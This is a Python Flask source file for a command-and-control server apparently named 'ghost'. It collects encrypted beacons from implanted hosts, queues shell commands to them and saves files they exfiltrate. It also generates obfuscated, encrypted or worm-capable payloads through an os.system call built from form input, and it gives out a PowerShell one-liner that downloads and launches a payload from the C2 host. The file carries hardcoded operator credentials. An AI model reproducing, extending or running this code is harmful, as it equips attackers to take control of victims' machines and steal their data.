import eventlet
eventlet.monkey_patch()

from flask import send_from_directory, Flask, request, jsonify, render_template, redirect, session, url_for
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
from flask_socketio import SocketIO, emit
import sqlite3
import os
import base64
import json
import sys
from flask import send_from_directory
from datetime import datetime, UTC

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

try:
    with open(os.path.join(os.path.dirname(__file__), '..', 'config.json')) as f:
        config = json.load(f)
except FileNotFoundError:
    with open(os.path.join(os.path.dirname(__file__), '..', 'config.example.json')) as f:
        config = json.load(f)

C2_HOST = config.get("c2_host", "http://localhost:8080")


sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../utils')))
from crypto import aes_decrypt, aes_encrypt

app = Flask(__name__)
app.secret_key = 'super-ghost-key'

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"

socketio = SocketIO(app, cors_allowed_origins="*")

DB_PATH = os.path.join(os.path.dirname(__file__), 'beacons.db')

class Operator(UserMixin):
    def __init__(self, id):
        self.id = id

USER_CREDENTIALS = {
    "admin": "ghostpass123"
}

@login_manager.user_loader
def load_user(user_id):
    return Operator(user_id)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS beacons (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, hostname TEXT, timestamp TEXT, payload TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, hostname TEXT, command TEXT, status TEXT, result TEXT)")
    conn.commit()
    conn.close()

UPLOAD_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'public', 'payloads'))
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get("username")
        password = request.form.get("password")
        if username in USER_CREDENTIALS and USER_CREDENTIALS[username] == password:
            login_user(Operator(username))
            return redirect(url_for('dashboard'))
        return "Invalid credentials", 401
    return render_template("login.html")

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect('/login')

@app.route('/')
@login_required
def dashboard():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, hostname, command, status, result FROM tasks ORDER BY id DESC")
    tasks = c.fetchall()
    conn.close()
    return render_template("dashboard.html", tasks=tasks)

@app.route('/api/beacons', methods=['GET'])
@login_required
def get_beacons():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT hostname, ip, timestamp, payload FROM beacons ORDER BY timestamp DESC")
    rows = c.fetchall()
    conn.close()
    beacons = []
    for row in rows:
        hostname, ip, timestamp, payload = row
        try:
            last_seen = datetime.fromisoformat(timestamp)
            delta = (datetime.now(UTC) - last_seen).total_seconds()
        except:
            delta = 999999
        beacons.append({
            "hostname": hostname,
            "ip": ip,
            "last_seen_seconds": delta,
            "payload": payload,
            "timestamp": timestamp
        })
    return jsonify(beacons)

@app.route('/api/beacon/<hostname>')
@login_required
def get_beacon_detail(hostname):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Get the most recent beacon check-in for this host
    c.execute("SELECT ip, payload, MAX(timestamp) as last_seen FROM beacons WHERE hostname = ?", (hostname,))
    row = c.fetchone()

    if not row:
        conn.close()
        return jsonify({"error": "Beacon not found"}), 404

    ip, payload, last_seen = row

    # Get the last 10 tasks
    c.execute("SELECT command, result FROM tasks WHERE hostname = ? ORDER BY id DESC LIMIT 10", (hostname,))
    tasks = [{"command": cmd, "result": res} for cmd, res in c.fetchall()]
    conn.close()

    return jsonify({
        "hostname": hostname,
        "ip": ip,
        "timestamp": last_seen,
        "payload": payload,
        "tasks": tasks
    })




@app.route('/add_task', methods=['POST'])
@login_required
def add_task():
    hostname = request.form.get('hostname')
    command = request.form.get('command')
    if not hostname or not command:
        return "Missing input", 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, command))
    conn.commit()
    conn.close()
    return redirect('/')

@app.route('/console')
@login_required
def console():
    return render_template("console.html")

@app.route('/console_data')
def console_data():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT DISTINCT hostname FROM beacons ORDER BY hostname")
    hosts = [row[0] for row in c.fetchall()]
    conn.close()
    return jsonify({"hosts": hosts})

@app.route('/console_send', methods=['POST'])
@login_required
def console_send():
    data = request.get_json()
    hostname = data.get("hostname")
    command = data.get("command")
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, command))
    conn.commit()
    conn.close()
    return jsonify({"status": "task added"})

@app.route('/console_output')
@login_required
def console_output():
    hostname = request.args.get("hostname")
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT command, result FROM tasks WHERE hostname = ? AND result != '' ORDER BY id DESC LIMIT 5", (hostname,))
    rows = c.fetchall()
    conn.close()
    output = "\n\n".join([f"$ {cmd}\n{res}" for cmd, res in rows]) or "[+] No output yet..."
    return output

@app.route('/beacon', methods=['POST'])
def beacon():
    encrypted = request.data.decode()
    data = json.loads(aes_decrypt(encrypted))
    ip = request.remote_addr
    hostname = data.get('hostname', 'unknown')
    payload = data.get('payload', 'none')
    timestamp = datetime.now(UTC).isoformat()

    print(f"[+] Beacon received from {hostname} ({ip}) - Payload: {payload}")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO beacons (ip, hostname, timestamp, payload) VALUES (?, ?, ?, ?)", (ip, hostname, timestamp, payload))
    c.execute("SELECT id, command FROM tasks WHERE hostname = ? AND status = 'pending'", (hostname,))
    tasks = c.fetchall()
    c.execute("UPDATE tasks SET status = 'dispatched' WHERE hostname = ? AND status = 'pending'", (hostname,))
    conn.commit()
    conn.close()

    commands = [cmd for _, cmd in tasks]
    return jsonify({'tasks': commands}), 200

@app.route('/result', methods=['POST'])
def result():
    encrypted = request.data.decode()
    data = json.loads(aes_decrypt(encrypted))
    hostname = data.get("hostname")
    command = data.get("command")
    result = data.get("result")

    # If result is a dict (e.g., from scan task), stringify it for storage/logging
    if isinstance(result, dict):
        result = json.dumps(result, indent=2)

    # Handle exfil results
    if isinstance(result, str) and result.startswith("[EXFIL:"):
        try:
            lines = result.splitlines()
            header = lines[0]
            b64data = "\n".join(lines[1:])
            filepath = header.split(":", 1)[1].strip().rstrip("]")
            filename = os.path.basename(filepath)
            decoded = base64.b64decode(b64data)
            outdir = os.path.join("downloads", hostname)
            os.makedirs(outdir, exist_ok=True)
            full_path = os.path.join(outdir, filename)
            with open(full_path, "wb") as f:
                f.write(decoded)
            print(f"[+] File received from {hostname}: {filename} saved to {full_path}")
        except Exception as ex:
            print(f"[!] Failed to process exfil file: {ex}")

    # Store result in database
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'",
        (result, hostname, command)
    )
    conn.commit()
    conn.close()

    # Emit result to live console view
    socketio.emit("console_result", {
        "hostname": hostname,
        "command": command,
        "result": result
    })

    return jsonify({"status": "result stored"})


@app.route('/generate', methods=['GET', 'POST'])
@login_required
def generate():
    if request.method == 'POST':
        c2url = request.form.get('c2url')
        resulturl = request.form.get('resulturl')
        filename = request.form.get('filename') or datetime.now(UTC).strftime("ghost_payload_%Y%m%d_%H%M%S")
        fileext = request.form.get('fileext', 'py')

        ext = fileext if fileext in ['py', 'exe'] else 'py'
        full_filename = f"{filename}.{ext}"
        out_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'builds', full_filename))

        os.makedirs(os.path.dirname(out_path), exist_ok=True)

        # Start building the command
        cmd = f"python3 ../tools/generate_payload.py --c2 {c2url} --result {resulturl} --output {out_path}"

        # Optional flags
        if ext == 'exe':
            cmd += " --exe"
        if 'obfuscate' in request.form:
            cmd += " --obfuscate"
        if 'encrypt' in request.form:
            cmd += " --encrypt"
        if 'worm' in request.form:
            cmd += " --worm"

        print(f"[+] Running: {cmd}")
        os.system(cmd)

        return redirect(url_for('download_payload', filename=full_filename))

    return render_template("generate.html")

@app.route('/api/server-ip')
@login_required
def get_server_ip():
    return jsonify({"ip": request.host.split(':')[0]})

@app.route('/download/<filename>')
@login_required
def download_payload(filename):
    builds_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'builds'))
    full_path = os.path.join(builds_dir, filename)

    if not os.path.isfile(full_path):
        print(f"[!] File not found: {full_path}")
        return f"File not found: {filename}", 404

    print(f"[+] Serving: {full_path}")
    return send_from_directory(builds_dir, filename, as_attachment=True)


@app.route('/upload', methods=['GET', 'POST'])
@login_required
def upload():
    if request.method == 'POST':
        file = request.files.get('file')
        if not file or file.filename == '':
            return "No file selected", 400

        filename = file.filename
        save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(save_path)

        ip = request.host.split(':')[0]
        drop_cmd = f"Invoke-WebRequest {C2_HOST}/payloads/{filename} -OutFile {filename}; Start-Process {filename}"

        return render_template("upload.html", success=True, filename=filename, drop_cmd=drop_cmd)

    return render_template("upload.html")

@app.route('/generate_ps_payload', methods=['GET'])
@login_required
def generate_ps_payload():
    from tools.ps_builder import generate_polymorphic_ps
    filename = generate_polymorphic_ps()
    return send_from_directory('payloads', filename)


@socketio.on('connect')
def handle_connect():
    print("[+] WebSocket client connected.")

@socketio.on('register')
def handle_register(encrypted_data):
    data = json.loads(aes_decrypt(encrypted_data))
    hostname = data.get("hostname")
    print(f"[+] Host registered: {hostname}")
    emit("ack", aes_encrypt(json.dumps({"msg": "Registered"})))

@socketio.on('result')
def handle_result(encrypted_data):
    data = json.loads(aes_decrypt(encrypted_data))
    hostname = data.get("hostname")
    last_seen[hostname] = time.time()
    command = data.get("command")
    result = data.get("result")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'", (result, hostname, command))
    conn.commit()
    conn.close()

    emit("ack", aes_encrypt(json.dumps({"msg": "Result stored"})))

    socketio.emit("console_result", {
        "hostname": hostname,
        "command": command,
        "result": result
    })

@socketio.on('send_command')
def handle_send_command(data):
    hostname = data.get("hostname")
    command = data.get("command")
    if not hostname or not command:
        return

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, command))
    conn.commit()
    conn.close()

@socketio.on('request_task')
def handle_task_request(encrypted_data):
    data = json.loads(aes_decrypt(encrypted_data))
    hostname = data.get("hostname")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, command FROM tasks WHERE hostname = ? AND status = 'pending' LIMIT 1", (hostname,))
    row = c.fetchone()

    if row:
        task_id, command = row
        c.execute("UPDATE tasks SET status = 'dispatched' WHERE id = ?", (task_id,))
        conn.commit()
        emit("task", aes_encrypt(json.dumps({"command": command})))
    else:
        emit("task", aes_encrypt(json.dumps({"command": ""})))
    conn.close()

if __name__ == '__main__':
    init_db()
    socketio.run(app, host='0.0.0.0', port=8080)
